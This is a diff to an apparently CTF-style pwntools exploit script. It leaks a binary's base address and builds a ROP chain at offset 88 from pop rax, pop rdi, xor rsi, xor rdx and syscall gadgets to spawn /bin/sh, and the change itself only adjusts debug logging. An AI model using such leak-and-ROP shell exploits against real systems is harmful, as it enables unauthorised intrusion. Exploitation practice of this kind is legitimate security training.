@@ -41,7 +41,7 @@ def leak():
     io.recvuntil('/bin/sh')
     leak = unpack(io.recv(6).ljust(8, b'\x00'))
     elf.address = leak - exe.sym['notcalled']
-    info("Elf base address: %#x", elf.address)
+    info("elf base address: %#x", elf.address)
 
 def rop():
     offset = 88
@@ -52,7 +52,12 @@ def rop():
     syscall = elf.address + 0x000000000000082a # syscall; 
     sh = 0x999999039
 
-    info("Pop rax: %#x", pop_rdi)
+    info("pop rax: %#x", pop_rax)
+    info("pop rdi: %#x", pop_rdi)
+    info("xor rsi: %#x", xor_rsi)
+    info("xor rdx: %#x", xor_rdx)
+    info("syscall: %#x", syscall)
+    
     payload = flat({
         offset: [
             pop_rax,
